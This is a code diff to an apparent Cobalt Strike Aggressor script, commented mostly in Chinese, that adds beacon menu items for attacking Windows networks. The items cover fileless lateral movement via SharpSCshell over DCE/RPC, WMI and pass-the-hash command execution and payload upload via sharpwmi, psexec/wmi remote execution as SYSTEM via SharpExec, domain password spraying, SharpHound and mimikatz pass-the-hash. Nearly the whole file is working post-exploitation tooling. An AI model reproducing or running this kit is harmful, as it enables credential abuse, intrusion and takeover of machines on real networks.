@@ -2,7 +2,9 @@
 #                            #
 #                            #
 #                            #
-#       Xway.cn@panda        #
+#       xway.cn@panda8       #
+#       secquan.org@panda8   #
+#		t00ls.com@panda8     #
 #                            #
 #                            #
 #                            #
@@ -27,19 +29,7 @@ sub internal_monologue{
 	bexecute_assembly($1, $binary, $args);
 }	
 
-			item "探测多网卡主机" {
-			$bid = $1['@'];
-			$dialog = dialog("SharpOXID-Find", %(ip => "192.168.1.1/24",bid => $bid), &SharpOXID-Find);
-			dialog_description($dialog, "OXID 解析器，用于探测多网口机器（依赖于 135 端口）,-i扫描指定ip,-c扫描C段。");
-			drow_combobox($dialog, "type", "type:", @("-i","-c"));
-			drow_text($dialog, "ip", "ip:  ");			
-            dbutton_action($dialog, "运行");
-			dialog_show($dialog);
-        }
-sub SharpOXID-Find {
-	$arg = join(' ',  @($3['type'],$3['ip']));
-	bexecute_assembly($bid, script_resource("/script/SharpOXID-Find.exe"), $arg);
-}	
+
 		
 		item "SharpHound3.0" {
 			bexecute_assembly($1, script_resource("/script/SharpHound.exe"), "");
@@ -62,7 +52,7 @@ sub mimikatz_passthehash{
 	}
 	)
 	);
-	dialog_description($dialog, "Ask Beacon to create a token that passes the specified hash. This is the pth command in Beacon. It uses mimikatz.");
+	dialog_description($dialog, "使用cs内置的mimikatz进行横向");
 	drow_text($dialog, "beacon",  "Beacon:");
 	drow_text($dialog, "domain",  "Domain:");
 	drow_text($dialog, "user",  "User:");
@@ -71,50 +61,84 @@ sub mimikatz_passthehash{
 	dialog_show($dialog);
 }
 
+			item "SharpSCshell" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpSCshell", %(target => "192.168.1.1",service => "testservice",payload => "c:\\windows\\system32\\cmd.exe /c calc",domain => ".",user => "administrator",pass => "123456",bid => $bid), &SCshell);	
+			drow_text($dialog, "target", "target:  ");
+			drow_text($dialog, "service", "service:  ");
+			drow_text($dialog, "payload", "payload:  ");
+			drow_text($dialog, "domain", "domain:  ");
+			drow_text($dialog, "user", "user:  ");		
+			drow_text($dialog, "pass", "pass:  ");			
+			dialog_description($dialog, "通过DCE/RPC协议进行无文件横向移动");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SCshell {
+		bexecute_assembly($bid, script_resource("/script/SharpSCshell.exe"), "$3['target'] $3['service'] \"$3['payload']\" $3['domain'] $3['user'] $3['pass']");
+}	
+
 	    menu "sharpwmi" {
-			item "上传sharpwmi" {
+			item "命令执行" {
 				$bid = $1;
-				$dialog = dialog("上传sharpwmi", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sharpwmi_up);
-				drow_text($dialog, "UploadPath",  "上传路径: "); 	
-				dbutton_action($dialog, "上传");
+				$dialog = dialog("命令执行", %(ip => "",user => "administrator",pass => "",cmd => "whoami", bid => $bid), &sharpwmi_cmd);
+				drow_text($dialog, "ip",  "ip: ");
+				drow_text($dialog, "user",  "user: ");
+				drow_text($dialog, "pass",  "pass: ");
+				drow_text($dialog, "cmd",  "cmd: "); 
+				dbutton_action($dialog, "运行");
 				dialog_show($dialog);
         }
-sub sharpwmi_up {
-
-    bcd($bid, $3['UploadPath']);
-        bupload($bid, script_resource("/script/sharpwmi.exe"));
-    
-
-}
-                item "运行sharpwmi"{
-                    $bid = $1['@'];
-                    $Dialog = dialog("运行sharpwmi",%(ip => "127.0.0.1", username => "administrator", password => "password", type => "cmd or upload", cmd/path => "cmd or upload path",bid => $bid),&sharpwmi_run);
-                    dialog_description($Dialog, "这是一个基于135端口来进行横向移动的工具，具有执行命令和上传文件功能，通过wmi来执行命令，通过调用来进行数据传输,目前只支持上传512kb以下的文件，因为重置每个值的长度不能超过512kb。");
-                    drow_text($Dialog, "ip", "ip: ");
-					drow_text($Dialog, "username", "username: ");
-					drow_text($Dialog, "password", "password: ");
-					drow_text($Dialog, "type", "cmd/upload: ");
-					drow_text($Dialog, "cmd/path", "cmd/path: ");
-                    dbutton_action($Dialog, "运行");
-                    dialog_show($Dialog);
-                }
-
-sub sharpwmi_run{
-    local('$Name $username $password $type $cmd/path');
-    $Name = $3['ip'];
-	$username = $3['username'];
-	$password = $3['password'];
-	$type = $3['type'];
-	$cmd/path = $3['cmd/path'];
-	bshell($bid, "sharpwmi.exe  $+ $Name  $+ $port  $+ $username  $+ $password  $+ $type  $+ $cmd/path");
+sub sharpwmi_cmd{
+		$arg = join(' ', @($3['ip'],$3['user'],$3['pass'],"cmd",$3['cmd']));
+		bexecute_assembly($bid, script_resource("/script/sharpwmi.exe"), $arg);	
 } 
-        	item "删除sharpwmi"{
-        	local('$bid');
-        	foreach $bid ($1){
-            	bshell($1, "del /f /s /q sharpwmi.exe");
-        	}
+
+			item "文件上传" {
+				$bid = $1;
+				$dialog = dialog("文件上传", %(ip => "",user => "administrator",pass => "",localpath => "",remotepath => "c:\\windows\\temp\\payload.exe",bid => $bid), &sharpwmi_upload);
+				dialog_description($dialog, "只支持上传512kb以下的文件");
+				drow_text($dialog, "ip",  "ip: ");
+				drow_text($dialog, "user",  "user: ");
+				drow_text($dialog, "pass",  "pass: ");
+				drow_file($dialog, "localpath", "localfile: ");
+				drow_text($dialog, "remotepath",  "remotepath: "); 
+				dbutton_action($dialog, "运行");
+				dialog_show($dialog);
+        }	
+sub sharpwmi_upload{
+		$arg = join(' ', @($3['ip'],$3['user'],$3['pass'],"upload",$3['localpath'],$3['remotepath']));
+		bexecute_assembly($bid, script_resource("/script/sharpwmi.exe"), $arg);	
+} 	
+
+			item "PTH命令执行" {
+				$bid = $1;
+				$dialog = dialog("PTH命令执行", %(ip => "",cmd => "whoami", bid => $bid), &sharpwmi_pth_cmd);
+				drow_text($dialog, "ip",  "ip: ");
+				drow_text($dialog, "cmd",  "cmd: "); 
+				dbutton_action($dialog, "运行");
+				dialog_show($dialog);
+        }
+sub sharpwmi_pth_cmd{
+		$arg = join(' ', @("pth",$3['ip'],"cmd",$3['cmd']));
+		bexecute_assembly($bid, script_resource("/script/sharpwmi.exe"), $arg);	
+} 
+
+			item "PTH文件上传" {
+				$bid = $1;
+				$dialog = dialog("PTH文件上传", %(ip => "",localpath => "",remotepath => "c:\\windows\\temp\\payload.exe",bid => $bid), &sharpwmi_pth_upload);
+				dialog_description($dialog, "只支持上传512kb以下的文件");
+				drow_text($dialog, "ip",  "ip: ");
+				drow_file($dialog, "localpath", "localfile: ");
+				drow_text($dialog, "remotepath",  "remotepath: "); 
+				dbutton_action($dialog, "运行");
+				dialog_show($dialog);
+        }	
+sub sharpwmi_pth_upload{
+		$arg = join(' ', @("pth",$3['ip'],"upload",$3['localpath'],$3['remotepath']));
+		bexecute_assembly($bid, script_resource("/script/sharpwmi.exe"), $arg);	
+} 		
 		}
-}
 
 	    menu "WMIHACKER" {
 			item "上传WMIHACKER" {
@@ -218,10 +242,50 @@ sub WMIHACKER_download{
 	$remotepath = $3['remotepath'];
 	bshell($bid, "cscript WMIHACKER.vbs /download  $+ $host  $+ $user  $+ \"$pass\"  $+ \"$localpath\"  $+ \"$remotepath\"");
 } 
-
-
-
 		}
+		
+
+menu "SharpExec" {
+
+			item "上传文件并执行" {
+			$bid = $1['@'];
+			$dialog = dialog("上传文件并执行", %(type => "psexec",ip => "",user => "TargetUser",pass => "",domain => "TargetDomain",localpath => "",remotepath => "C:\\payload.exe",bid => $bid), &SharpExec_file);
+			dialog_description($dialog, "将文件从User1上载到远程系统上的C:\\并且执行该文件,psexec以system权限执行,wmi以targetuser权限执行");
+			drow_combobox($dialog, "type", "type", @("psexec", "wmi"));
+			drow_text($dialog, "ip", "ip:  ");	
+			drow_text($dialog, "user", "user:  ");	
+			drow_text($dialog, "pass", "pass:  ");	
+			drow_text($dialog, "domain", "domain:  ");		
+			drow_file($dialog, "localpath", "本地文件: ");
+			drow_text($dialog, "remotepath", "远程路径:  ");			
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpExec_file {
+		$arg = join('', @("-m=",$3['type']," ","-i=",$3['ip']," ","-u=",$3['user']," ","-p=",$3['pass']," ","-d=",$3['domain']," ","-f=",$3['localpath']," ","-e=",$3['remotepath']));
+		bexecute_assembly($bid, script_resource("/script/SharpExec.exe"), $arg);
+        }
+		
+			item "远程执行命令" {
+			$bid = $1['@'];
+			$dialog = dialog("远程执行命令", %(type => "psexec",ip => "",user => "TargetUser",pass => "",domain => "TargetDomain",cmdpath => "C:\\Windows\\System32\\cmd.exe",args => "\"whoami\"",bid => $bid), &SharpExec_cmd);
+			dialog_description($dialog, "远程执行命令,psexec以system权限执行,wmi以targetuser权限执行");
+			drow_combobox($dialog, "type", "type", @("psexec", "wmi"));
+			drow_text($dialog, "ip", "ip:  ");	
+			drow_text($dialog, "user", "user:  ");	
+			drow_text($dialog, "pass", "pass:  ");	
+			drow_text($dialog, "domain", "domain:  ");		
+			drow_text($dialog, "cmdpath", "cmdpath:  ");
+			drow_text($dialog, "args", "args:  ");			
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpExec_cmd {
+		$arg = join('', @("-m=",$3['type']," ","-i=",$3['ip']," ","-u=",$3['user']," ","-p=",$3['pass']," ","-d=",$3['domain']," ","-e=",$3['cmdpath']," ","-c=",$3['args']));
+		bexecute_assembly($bid, script_resource("/script/SharpExec.exe"), $arg);
+        }
+		}
+		
 			item "枚举域用户密码" {
 			$bid = $1['@'];
 			$dialog = dialog("SharpDomainSpray", %(content => "",bid => $bid), &SharpDomainSpray);
@@ -272,6 +336,22 @@ sub SharpShares {
 	$arg = join(' ',  @($3['type']));
 	bexecute_assembly($bid, script_resource("/script/SharpShares.exe"), $arg);
 }
-		
+
+			item "获取远程主机上的进程" {
+			$bid = $1['@'];
+			$dialog = dialog("获取远程主机上的进程", %(computername => "win7.sun.com",user => "administrator",pass => "dc123.com",bid => $bid), &net_domaintask);
+			dialog_description($dialog, "解析域名");
+			drow_text($dialog, "computername", "computername:  ");
+			drow_text($dialog, "user", "user:  ");
+			drow_text($dialog, "pass", "pass:  ");			
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub net_domaintask {
+	$arg = join(' ',  @("Get-Process -ComputerName",$3['computername'],"-Username",$3['user'],"-Password",$3['pass']));
+	bexecute_assembly($bid, script_resource("/script/NoPowerShell.exe"), $arg);
+}	
+
+
 		
 		}
